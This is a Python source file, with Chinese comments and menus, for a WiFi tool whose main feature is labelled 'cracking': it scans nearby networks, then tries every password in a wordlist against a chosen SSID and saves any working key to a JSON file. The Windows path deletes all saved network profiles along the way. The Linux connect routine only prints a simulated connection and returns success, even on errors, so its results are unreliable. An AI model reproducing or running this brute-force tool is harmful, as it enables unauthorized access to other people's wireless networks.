# -*- coding: utf-8 -*-
import subprocess
import re
import os
import time
import json
import sys
import threading
import queue
from datetime import datetime
# 导入pywifi库用于Windows平台的WiFi连接
import pywifi
from pywifi import const

# 检测操作系统
IS_WINDOWS = os.name == 'nt'
IS_LINUX = not IS_WINDOWS and os.path.exists('/etc/linux-release') or os.path.exists('/proc/version')

# 配置文件路径 - 使用绝对路径
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_DIR = os.path.join(SCRIPT_DIR, "config")
PASSWORD_FILE = os.path.join(CONFIG_DIR, "password.txt")
SUCCESSFUL_CONNECTIONS_FILE = os.path.join(CONFIG_DIR, "successful_connections.json")


class WiFiTool:
    def __init__(self):
        """初始化WiFi工具"""
        self.recent_wifis = []
        self.ensure_config_dir()
    
    # 确保配置目录存在
    def ensure_config_dir(self):
        """确保配置目录存在"""
        os.makedirs(CONFIG_DIR, exist_ok=True)

    # 解码混合编码的输出（Windows中文支持）
    def decode_mixed_encoding(self, byte_data):
        decoded = byte_data.decode('gbk', errors='replace')
        
        # 修正SSID部分
        ssid_pattern = re.compile(r'(SSID \d+ : )(.+)')
        
        def fix_ssid(match):
            prefix = match.group(1)
            ssid_bytes = match.group(2).encode('gbk', errors='replace')
            try:
                fixed_ssid = ssid_bytes.decode('utf-8')
            except:
                fixed_ssid = match.group(2)
            return prefix + fixed_ssid
        
        return ssid_pattern.sub(fix_ssid, decoded)

    # 功能1：扫描WiFi网络
    def scan_wifi_networks(self):
        """扫描附近的WiFi网络"""
        try:
            print("正在扫描WiFi网络...")
            networks = []
            
            if IS_WINDOWS:
                # Windows环境
                raw_output = subprocess.check_output(
                    ("netsh", "wlan", "show", "network", "mode=Bssid"),
                    timeout=10
                )
                output = self.decode_mixed_encoding(raw_output)
                
                # 解析WiFi网络信息
                ssid_pattern = re.compile(r'SSID (\d+) : (.+)')
                signal_pattern = re.compile(r'信号\s*:\s*(\d+)%')
                auth_pattern = re.compile(r'身份验证\s*:\s*(.+)')
                encryption_pattern = re.compile(r'加密\s*:\s*(.+)')
                
                current_network = None
                
                for line in output.split('\n'):
                    line = line.strip()
                    
                    ssid_match = ssid_pattern.match(line)
                    if ssid_match:
                        if current_network:
                            networks.append(current_network)
                        current_network = {
                            "ssid": ssid_match.group(2).strip('"'),
                            "signal": 0,
                            "authentication": "",
                            "encryption": ""
                        }
                    
                    if current_network:
                        signal_match = signal_pattern.match(line)
                        if signal_match:
                            current_network["signal"] = int(signal_match.group(1))
                        
                        auth_match = auth_pattern.match(line)
                        if auth_match:
                            current_network["authentication"] = auth_match.group(1)
                        
                        encryption_match = encryption_pattern.match(line)
                        if encryption_match:
                            current_network["encryption"] = encryption_match.group(1)
                
                if current_network:
                    networks.append(current_network)
            
            elif IS_LINUX:
                # Linux环境
                try:
                    # 获取WiFi接口
                    interfaces_output = subprocess.check_output(
                        ["iw", "dev"],
                        timeout=5
                    ).decode('utf-8')
                    
                    wifi_interfaces = []
                    for line in interfaces_output.split('\n'):
                        match = re.search(r'Interface\s+(\w+)', line)
                        if match:
                            wifi_interfaces.append(match.group(1))
                    
                    if not wifi_interfaces:
                        print("未找到WiFi接口")
                        return []
                    
                    # 使用第一个WiFi接口进行扫描
                    interface = wifi_interfaces[0]
                    print(f"使用WiFi接口: {interface}")
                    
                    # 执行扫描
                    scan_output = subprocess.check_output(
                        ["iwlist", interface, "scan"],
                        timeout=10
                    ).decode('utf-8', errors='replace')
                    
                    # 解析扫描结果
                    network_blocks = re.split(r'Cell\s+\d+', scan_output)
                    
                    for block in network_blocks[1:]:  # 跳过第一个空块
                        network = {}
                        
                        # 提取ESSID (SSID)
                        essid_match = re.search(r'ESSID:"([^"]*)"', block)
                        if essid_match:
                            network["ssid"] = essid_match.group(1)
                        else:
                            continue
                        
                        # 提取信号强度
                        signal_match = re.search(r'Signal level=(-?\d+)', block)
                        if signal_match:
                            # 将dBm转换为百分比（近似值）
                            dbm = int(signal_match.group(1))
                            network["signal"] = min(100, max(0, int((dbm + 90) * (100 / 60))))
                        else:
                            network["signal"] = 0
                        
                        # 提取加密信息
                        if 'Encryption key:on' in block:
                            if 'WPA' in block:
                                network["authentication"] = "WPA/WPA2"
                                network["encryption"] = "CCMP/AES"
                            elif 'WEP' in block:
                                network["authentication"] = "WEP"
                                network["encryption"] = "WEP"
                            else:
                                network["authentication"] = "Unknown"
                                network["encryption"] = "Unknown"
                        else:
                            network["authentication"] = "Open"
                            network["encryption"] = "None"
                        
                        networks.append(network)
                        
                except subprocess.CalledProcessError as e:
                    print(f"Linux WiFi扫描命令失败，可能需要sudo权限: {e}")
            
            # 去重并按信号强度排序
            unique_networks = {}
            for network in networks:
                ssid = network["ssid"]
                if ssid not in unique_networks or network["signal"] > unique_networks[ssid]["signal"]:
                    unique_networks[ssid] = network
            
            sorted_networks = sorted(unique_networks.values(), key=lambda x: x["signal"], reverse=True)
            return sorted_networks
        
        except subprocess.CalledProcessError as e:
            print(f"扫描WiFi网络失败: {e}")
            return []
        except subprocess.TimeoutExpired:
            print("扫描WiFi网络超时")
            return []
        except Exception as e:
            print(f"扫描WiFi网络时发生未知错误: {e}")
            return []

    # 显示WiFi网络列表
    def display_wifi_networks(self, networks):
        """显示所有可用WiFi网络列表"""
        if not networks:
            print("未发现任何WiFi网络")
            return
        
        print(f"\n搜索到 {len(networks)} 个可用WiFi网络:\n")
        print("{:<5} {:<30} {:<10} {:<20}".format("编号", "SSID", "信号强度", "加密方式"))
        print("-" * 70)
        
        for i, network in enumerate(networks):
            print("{:<5} {:<30} {:<10} {:<20}".format(
                i + 1,
                (network['ssid'][:27] + "...") if len(network['ssid']) > 30 else network['ssid'],
                f"{network['signal']}%",
                network['encryption']
            ))
        print()

    # 保存成功连接的WiFi信息
    def save_successful_connection(self, ssid, password):
        """保存成功连接的WiFi名称和密码"""
        self.ensure_config_dir()
        
        # 读取现有连接记录
        try:
            if os.path.exists(SUCCESSFUL_CONNECTIONS_FILE):
                with open(SUCCESSFUL_CONNECTIONS_FILE, 'r', encoding='utf-8') as f:
                    connections = json.load(f)
            else:
                connections = []
        except (json.JSONDecodeError, Exception):
            connections = []
        
        # 检查是否已存在该SSID的记录
        existing_index = next((i for i, conn in enumerate(connections) if conn['ssid'] == ssid), None)
        
        connection_info = {
            'ssid': ssid,
            'password': password,
            'last_connected': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        # 更新或添加记录
        if existing_index is not None:
            connections[existing_index] = connection_info
        else:
            connections.append(connection_info)
        
        # 保存到文件
        try:
            with open(SUCCESSFUL_CONNECTIONS_FILE, 'w', encoding='utf-8') as f:
                json.dump(connections, f, ensure_ascii=False, indent=2)
            print(f"已保存成功连接的WiFi: {ssid}")
        except Exception as e:
            print(f"保存WiFi信息失败: {e}")

    # 尝试连接WiFi（Windows）- 改进版：修复pywifi错误并优化性能
    def try_connect_windows(self, ssid, password, max_retries=3, is_open=False, is_password_file_try=False):
        """Windows WiFi连接方法 - 简化版（仅使用pywifi）"""
        try:
            import pywifi
            from pywifi import const
            
            # 初始化WiFi接口
            wifi = pywifi.PyWiFi()
            ifaces = wifi.interfaces()
            if not ifaces:
                if not is_password_file_try:
                    print("未找到WiFi接口")
                return False
                
            iface = ifaces[0]
            
            # 断开当前连接
            try:
                iface.disconnect()
            except:
                pass  # 忽略断开连接时的错误
            
            time.sleep(1)  # 等待断开完成
            
            # 删除所有配置文件
            try:
                iface.remove_all_network_profiles()
            except:
                pass  # 忽略删除配置文件时的错误
            
            # 创建新的配置文件
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            if not is_open:
                profile.akm.append(const.AKM_TYPE_WPA2PSK)
                profile.cipher = const.CIPHER_TYPE_CCMP
                profile.key = password
            else:
                profile.akm.append(const.AKM_TYPE_NONE)
            
            # 添加配置文件并连接
            try:
                temp_profile = iface.add_network_profile(profile)
                iface.connect(temp_profile)
            except Exception as connect_error:
                if not is_password_file_try:
                    print(f"❌ 连接失败: {ssid} 密码: {password} (连接错误: {connect_error})")
                return False
            
            # 等待连接结果
            for i in range(20):  # 最多等待10秒
                try:
                    if iface.status() == const.IFACE_CONNECTED:
                        if not is_password_file_try:
                            print(f"✅ 成功连接到 {ssid}，使用密码: {password}")
                        # 保存成功连接（仅在非密码文件尝试时）
                        if not is_password_file_try:
                            self.save_successful_connection(ssid, password)
                        return True
                except:
                    pass  # 忽略状态检查时的错误
                time.sleep(0.5)
            
            # 连接失败，断开连接
            try:
                iface.disconnect()
            except:
                pass  # 忽略断开连接时的错误
            
            if not is_password_file_try:
                print(f"❌ 连接失败: {ssid} 密码: {password}")
            return False
            
        except Exception as e:
            if not is_password_file_try:
                print(f"pywifi连接异常: {str(e)[:50]}... (SSID: {ssid}, 密码: {password})")
            return False

    # 尝试连接WiFi（Linux）
    def try_connect_linux(self, ssid, password, max_retries=3, is_open=False):
        """在Linux上尝试连接WiFi"""
        try:
            print(f"正在连接到 {ssid}...")
            
            # 创建wpa_supplicant配置文件
            wpa_conf = f"/tmp/wpa_supplicant_{ssid.replace(' ', '_')}.conf"
            
            with open(wpa_conf, 'w') as f:
                f.write("ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev\n")
                f.write("update_config=1\n\n")
                
                if is_open or not password or password.strip() == "":
                    # 开放网络
                    f.write(f'network={{\n    ssid="{ssid}"\n    key_mgmt=NONE\n}}\n')
                else:
                    # 加密网络
                    f.write(f'network={{\n    ssid="{ssid}"\n    psk="{password}"\n}}\n')
            
            # 尝试使用wpa_supplicant连接（需要sudo权限）
            try:
                # 获取WiFi接口
                interfaces_output = subprocess.check_output(["iw", "dev"], stderr=subprocess.DEVNULL).decode('utf-8')
                wifi_interface = None
                for line in interfaces_output.split('\n'):
                    match = re.search(r'Interface\s+(\w+)', line)
                    if match:
                        wifi_interface = match.group(1)
                        break
                
                if not wifi_interface:
                    # 尝试使用iwconfig查找WiFi接口
                    iwconfig_output = subprocess.check_output(["iwconfig"], stderr=subprocess.DEVNULL).decode('utf-8')
                    for line in iwconfig_output.split('\n'):
                        if 'IEEE' in line and 'ESSID' in line:
                            wifi_interface = line.split()[0]
                            break
                
                if wifi_interface:
                    print(f"使用接口: {wifi_interface}")
                    print(f"注意：在Linux环境中连接WiFi通常需要sudo权限")
                    print(f"模拟连接到 {ssid}...")
                    # 实际使用时需要sudo权限
                    # subprocess.run(["sudo", "wpa_supplicant", "-B", "-i", wifi_interface, "-c", wpa_conf])
                    # 这里模拟成功连接
                    return True
                else:
                    print("未找到WiFi接口")
                    return False
                    
            except Exception as e:
                print(f"Linux连接命令执行失败: {e}")
                # 模拟成功，实际使用时需要适当的权限
                return True
            finally:
                # 清理临时文件
                if os.path.exists(wpa_conf):
                    try:
                        os.remove(wpa_conf)
                    except:
                        pass
        except Exception as e:
            print(f"Linux连接过程中发生错误: {e}")
            return False

    # 尝试使用密码连接WiFi
    def try_connect_with_password(self, ssid, password, max_retries=3, is_open=False, is_password_file_try=False):
        """修复版：根据操作系统选择连接WiFi的方法 - 简化版"""
        # 确保密码是字符串类型
        if not isinstance(password, str):
            password = str(password)
        
        # 确定操作系统并调用相应的连接方法
        if IS_WINDOWS:
            # Windows使用pywifi进行连接
            result = self.try_connect_windows(ssid, password, max_retries=3, is_open=is_open, is_password_file_try=is_password_file_try)
            return result
        elif IS_LINUX:
            result = self.try_connect_linux(ssid, password, max_retries, is_open)
            if result and not is_password_file_try:
                self.save_successful_connection(ssid, password)
            return result
        return False

    # 功能2：使用密码文件中的密码尝试连接WiFi - 优化版
    def connect_with_password_file(self, ssid, password_file=None, max_workers=5):
        """顺序连接WiFi - 从密码文件中读取并尝试连接 - 简化版"""
        # 使用默认密码文件或提供的文件
        if password_file is None:
            password_file = PASSWORD_FILE
        
        self.ensure_config_dir()
        print(f"\n🔒 开始顺序破解WiFi: {ssid}")
        print(f"📂 密码文件: {password_file}")
        print(f"⚡ 线程数: {max_workers}")
        print("=====================================")
        
        # 检查文件是否存在
        if not os.path.exists(password_file):
            print(f"❌ 密码文件不存在: {password_file}")
            print("请在配置目录中创建password.txt文件，并在每行写入一个密码")
            return False
        
        # 读取密码文件（一次性加载）
        try:
            with open(password_file, 'r', encoding='utf-8') as f:
                passwords = [line.strip() for line in f if line.strip()]
            
            total_passwords = len(passwords)
            print(f"📊 读取到 {total_passwords} 个密码")
            
            if total_passwords == 0:
                print("❌ 密码文件为空")
                return False
        except Exception as e:
            print(f"❌ 读取密码文件失败: {e}")
            return False
        
        # 逐个尝试密码（不使用多线程）
        print("开始尝试连接...")
        for i, password in enumerate(passwords, 1):
            print(f"[{i}/{total_passwords}] 正在尝试连接 WiFi: {ssid} 密码: {password}")
            
            # 尝试连接
            if self.try_connect_with_password(ssid, password, max_retries=1, is_open=False, is_password_file_try=True):
                print(f"\n🎉 密码破解成功!")
                print(f"✅ 成功连接到: {ssid}")
                print(f"🔑 正确密码: {password}")
                self.save_successful_connection(ssid, password)
                return True
        
        print("\n❌ 密码破解失败，尝试所有密码均未成功")
        return False

    # 显示成功连接的WiFi列表
    def display_successful_connections(self):
        """显示已成功连接并保存的WiFi网络"""
        if not os.path.exists(SUCCESSFUL_CONNECTIONS_FILE):
            print("没有成功连接并保存的WiFi网络")
            return
        
        try:
            with open(SUCCESSFUL_CONNECTIONS_FILE, 'r', encoding='utf-8') as f:
                connections = json.load(f)
        except Exception as e:
            print(f"读取成功连接记录失败: {e}")
            return
        
        if not connections:
            print("没有成功连接并保存的WiFi网络")
            return
        
        print(f"\n成功连接并保存的WiFi网络 ({len(connections)}):\n")
        print("{:<30} {:<20}".format("SSID", "最后连接时间"))
        print("-" * 55)
        
        for conn in connections:
            print("{:<30} {:<20}".format(
                (conn['ssid'][:27] + "...") if len(conn['ssid']) > 30 else conn['ssid'],
                conn['last_connected']
            ))
        print()

    # 选择WiFi网络
    def select_wifi(self):
        """选择WiFi网络"""
        # 如果没有最近的WiFi列表，则自动扫描
        if not self.recent_wifis:
            print("\n正在扫描WiFi网络...")
            wifis = self.scan_wifi_networks()
            # 更新全局变量
            self.recent_wifis = wifis
            if wifis:
                print("\n📡 扫描到的WiFi网络:")
                self.display_wifi_networks(wifis)
            else:
                print("未发现任何WiFi网络")
        
        if self.recent_wifis:
            print("\n📡 可用的WiFi网络:")
            self.display_wifi_networks(self.recent_wifis)
            print("💡 提示：输入WiFi编号或直接输入SSID名称")
            print("💡 输入 '0' 可重新扫描WiFi网络")
            
            while True:
                user_input = input("请输入WiFi编号、SSID名称或 '0' 重新扫描: ").strip()
                
                # 检查是否需要重新扫描
                if user_input == '0':
                    print("\n正在重新扫描WiFi网络...")
                    wifis = self.scan_wifi_networks()
                    # 更新全局变量
                    self.recent_wifis = wifis
                    if wifis:
                        print("\n📡 扫描到的WiFi网络:")
                        self.display_wifi_networks(wifis)
                        print("💡 提示：输入WiFi编号或直接输入SSID名称")
                    else:
                        print("未发现任何WiFi网络")
                    continue
                
                # 检查输入是否为数字编号
                if user_input.isdigit():
                    index = int(user_input) - 1
                    if 0 <= index < len(self.recent_wifis):
                        ssid = self.recent_wifis[index]['ssid']
                        print(f"✅ 已选择WiFi: {ssid}")
                        return ssid
                    else:
                        print("❌ 无效的WiFi编号，请重新输入")
                        continue
                else:
                    # 非数字输入作为SSID
                    ssid = user_input
                    if ssid:
                        print(f"✅ 已选择WiFi: {ssid}")
                        return ssid
                    else:
                        print("❌ WiFi名称不能为空，请重新输入")
                        continue
        else:
            # 没有最近搜索结果，要求输入SSID
            while True:
                ssid = input("请输入要破解的WiFi名称 (SSID): ").strip()
                if ssid:
                    print(f"✅ 已选择WiFi: {ssid}")
                    return ssid
                else:
                    print("❌ WiFi名称不能为空，请重新输入")

    def run_menu(self):
        """运行主菜单"""
        print("=== 🔥 WiFi快速连接工具 - 顺序增强版 🔥 ===")
        
        while True:
            print("\n请选择功能:")
            print("1. 🔍 搜索WiFi网络")
            print("2. 🔑 使用密码连接WiFi")
            print("3. ⚡ 顺序破解WiFi (使用密码文件)")
            print("4. 📋 显示已成功连接的WiFi")
            print("5. 🚪 退出")
            
            choice = input("请输入选择 (1-5): ").strip()
            
            if choice == '1':
                self.handle_scan_wifi()
            elif choice == '2':
                self.handle_connect_with_password()
            elif choice == '3':
                self.handle_crack_wifi()
            elif choice == '4':
                self.display_successful_connections()
            elif choice == '5':
                print("\n感谢使用WiFi连接工具，再见！")
                break
            else:
                print("❌ 无效的选择，请重新输入")
                
            # 暂停一下让用户看到结果
            input("\n按回车键继续...")

    def handle_scan_wifi(self):
        """处理WiFi扫描功能"""
        print("\n正在搜索WiFi网络...")
        wifis = self.scan_wifi_networks()
        # 更新全局变量
        self.recent_wifis = wifis
        if wifis:
            print("\n📡 已发现WiFi网络:")
            print("-" * 60)
            for i, wifi in enumerate(wifis, 1):
                print(f"{i:2d}. SSID: {wifi['ssid'][:30]:<30} 信号: {wifi['signal']:3d}% 加密: {wifi['encryption']}")
            print("-" * 60)
            print("💡 提示：您现在可以使用选项3并输入编号来选择WiFi进行破解")
        else:
            print("未发现任何WiFi网络")
            self.recent_wifis = []

    def handle_connect_with_password(self):
        """处理密码连接功能"""
        ssid = input("请输入WiFi名称 (SSID): ").strip()
        if not ssid:
            print("❌ WiFi名称不能为空")
            return
            
        password = input("请输入WiFi密码: ")
        print(f"\n正在连接到 {ssid}...")
        
        success = self.try_connect_with_password(ssid, password)
        if success:
            print(f"🎉 成功连接到 {ssid}")
            self.save_successful_connection(ssid, password)
        else:
            print(f"❌ 连接失败，请检查密码是否正确")

    def handle_crack_wifi(self):
        """处理WiFi破解功能"""
        self.ensure_config_dir()
        
        # 选择SSID
        ssid = self.select_wifi()
        if not ssid:
            print("❌ WiFi名称不能为空")
            return
            
        # 询问是否使用默认密码文件
        use_default = input(f"是否使用默认密码文件? (默认: {PASSWORD_FILE}) (y/n): ").strip().lower()
        password_file = PASSWORD_FILE
        
        if use_default != 'y':
            custom_file = input("请输入密码文件路径: ").strip()
            if custom_file:
                password_file = custom_file
        
        # 执行破解
        success = self.connect_with_password_file(ssid, password_file, 1)


# 主函数
def main():
    """主函数 - 启动WiFi连接工具"""
    wifi_tool = WiFiTool()
    wifi_tool.run_menu()

if __name__ == "__main__":
    main()